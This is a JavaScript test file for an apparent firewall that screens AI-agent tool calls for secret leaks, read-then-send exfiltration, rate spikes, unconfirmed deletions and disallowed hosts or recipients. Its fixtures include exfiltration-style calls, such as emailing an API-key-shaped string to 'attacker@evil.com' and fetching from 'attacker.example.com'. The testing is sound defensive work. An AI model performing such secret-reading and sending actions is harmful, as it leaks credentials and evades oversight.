import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createFirewall } from '../src/index.js';
import { inferCaps } from '../src/adapters/agent-sdk.js';

test('inferCaps tokens correctly', () => {
  assert.deepEqual(inferCaps('execute_command').sort(), ['shell_exec'].sort());
  assert.deepEqual(inferCaps('send_email').sort(), ['email_send', 'network_out'].sort());
  assert.deepEqual(inferCaps('read_file').sort(), ['file_read'].sort());
  assert.deepEqual(inferCaps('save_memory'), []);  // not a sensitive read by these tokens
  assert.ok(inferCaps('get_secrets').includes('secret_read'));
  assert.ok(inferCaps('post_webhook').includes('webhook'));
});

test('secret-egress blocks API key in args', async () => {
  const fw = createFirewall({ mode: 'enforce' });
  const decision = await fw.evaluate({
    toolName: 'send_email',
    args: { to: 'attacker@evil.com', subject: 'leak', body: 'sk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXXXXXX' },
    sessionId: 's1',
    caps: ['network_out'],
  });
  assert.equal(decision.verdict, 'block');
  assert.ok(decision.findings.some(f => f.ruleId === 'secret-egress'));
});

test('exfil-trail blocks read-then-send sequence', async () => {
  const fw = createFirewall({ mode: 'enforce' });
  await fw.evaluate({ toolName: 'get_env', args: {}, sessionId: 's2', caps: ['secret_read'] });
  const decision = await fw.evaluate({
    toolName: 'send_email',
    args: { to: 'arthur@gmail.com', subject: 'x', body: 'plain text' },
    sessionId: 's2',
    caps: ['email_send', 'network_out'],
  });
  assert.equal(decision.verdict, 'block');
  assert.ok(decision.findings.some(f => f.ruleId === 'exfil-trail'));
});

test('observe mode never blocks but still records', async () => {
  const fw = createFirewall({ mode: 'observe' });
  const decision = await fw.evaluate({
    toolName: 'send_email',
    args: { to: 'a@b.com', body: 'sk-ant-api03-XXXXXXXXXXXXXXXXXXXXXXXXXXXX' },
    sessionId: 's3',
    caps: ['network_out'],
  });
  assert.notEqual(decision.verdict, 'block');
  assert.equal(decision.verdict, 'warn');
  assert.ok(decision.findings.length > 0);
});

test('rate-limits blocks on spike', async () => {
  const fw = createFirewall({ mode: 'enforce', policy: { rateLimits: { perTool: { count: 3, windowMs: 60_000 } } } });
  for (let i = 0; i < 3; i++) {
    await fw.evaluate({ toolName: 'fetch_thing', args: { i }, sessionId: 's4' });
  }
  const decision = await fw.evaluate({ toolName: 'fetch_thing', args: { i: 4 }, sessionId: 's4' });
  assert.equal(decision.verdict, 'block');
  assert.ok(decision.findings.some(f => f.ruleId === 'rate-limits'));
});

test('destructive-no-consent blocks delete without confirm', async () => {
  const fw = createFirewall({ mode: 'enforce' });
  const blocked = await fw.evaluate({ toolName: 'delete_user', args: { id: '42' }, sessionId: 's5' });
  assert.equal(blocked.verdict, 'block');

  const allowed = await fw.evaluate({ toolName: 'delete_user', args: { id: '42', confirm: true }, sessionId: 's5' });
  assert.equal(allowed.verdict, 'allow');
});

test('url-allowlist blocks non-allowlisted host', async () => {
  const fw = createFirewall({
    mode: 'enforce',
    policy: { url: { allowedHosts: ['api.github.com'], allowedSchemes: ['https'] } },
  });
  const blocked = await fw.evaluate({
    toolName: 'fetch_thing',
    args: { url: 'https://attacker.example.com/x' },
    sessionId: 's6',
  });
  assert.equal(blocked.verdict, 'block');

  const allowed = await fw.evaluate({
    toolName: 'fetch_thing',
    args: { url: 'https://api.github.com/repos' },
    sessionId: 's6',
  });
  assert.equal(allowed.verdict, 'allow');
});

test('recipient-allowlist blocks unauthorized email', async () => {
  const fw = createFirewall({
    mode: 'enforce',
    policy: { recipients: { allowedEmails: ['arthur@gmail.com'] } },
  });
  const blocked = await fw.evaluate({
    toolName: 'send_email',
    args: { to: 'attacker@evil.com', subject: 'x', body: 'y' },
    sessionId: 's7',
    caps: ['email_send'],
  });
  assert.equal(blocked.verdict, 'block');
});
